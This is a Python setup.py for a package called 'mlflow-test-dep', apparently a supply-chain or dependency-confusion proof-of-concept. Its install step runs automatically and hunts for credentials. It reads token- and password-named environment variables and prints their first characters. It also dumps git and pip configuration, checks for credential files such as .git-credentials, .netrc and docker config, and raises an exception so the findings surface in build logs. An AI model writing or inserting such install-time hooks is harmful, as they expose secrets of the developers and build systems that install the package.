import os
import sys
import subprocess
from setuptools import setup

proof = "🚨🚨🚨 GIT_CREDENTIAL_SCAN 🚨🚨🚨\n\n"

# 1. Hunt for credential-shaped env vars (names + first 4 chars only)
proof += "=== Suspect environment variables ===\n"
for k, v in os.environ.items():
    ku = k.upper()
    if any(x in ku for x in ["TOKEN", "PASSWORD", "PASSWD", "SECRET", "GIT", "CRED", "API_KEY", "PAT", "AUTH"]):
        proof += f"  {k} = {v[:4]}...(len={len(v)})\n"

# 2. Check for a global git config with embedded credentials
proof += "\n=== git config --list ===\n"
try:
    out = subprocess.check_output(["git", "config", "--list", "--show-origin"], text=True, timeout=3)
    # Redact anything that looks like a URL with user:pass@
    import re
    redacted = re.sub(r"//[^@/\s]+@", "//<REDACTED>@", out)
    proof += redacted[:600] + "\n"
except Exception as e:
    proof += f"  git config error: {type(e).__name__}\n"

# 3. Check for on-disk credential files (existence + size only)
proof += "\n=== Credential file existence ===\n"
cred_paths = [
    "/root/.git-credentials",
    "/root/.netrc",
    "/root/.docker/config.json",
    "/root/.config/pip/pip.conf",
    "/etc/gitconfig",
    os.path.expanduser("~/.gitconfig"),
]
for p in cred_paths:
    if os.path.exists(p):
        try:
            proof += f"  EXISTS: {p} (size={os.path.getsize(p)} bytes)\n"
        except Exception:
            proof += f"  EXISTS: {p} (size unknown)\n"
    else:
        proof += f"  absent: {p}\n"

# 4. Check pip config (might reference an internal index with auth)
proof += "\n=== pip config ==="
try:
    out = subprocess.check_output(
        [sys.executable, "-m", "pip", "config", "list"],
        text=True, timeout=3
    )
    import re
    out = re.sub(r"(password|token)\s*=\s*\S+", r"\1=<REDACTED>", out, flags=re.I)
    proof += "\n" + out[:400] + "\n"
except Exception as e:
    proof += f"  pip config error: {type(e).__name__}\n"

# 5. Check how pip is configured to fetch from the internal mirror
proof += "\n=== pip env overrides ===\n"
for k in ["PIP_INDEX_URL", "PIP_EXTRA_INDEX_URL", "PIP_TRUSTED_HOST", "PIP_CERT"]:
    if k in os.environ:
        val = os.environ[k]
        # redact userinfo in URLs
        import re
        val = re.sub(r"//[^@/\s]+@", "//<REDACTED>@", val)
        proof += f"  {k} = {val[:120]}\n"

proof += "\n🚨🚨🚨 END CREDENTIAL SCAN 🚨🚨🚨\n"
print(proof)
raise Exception(proof)

setup(name="mlflow-test-dep", version="0.1", description="Git credential scan")
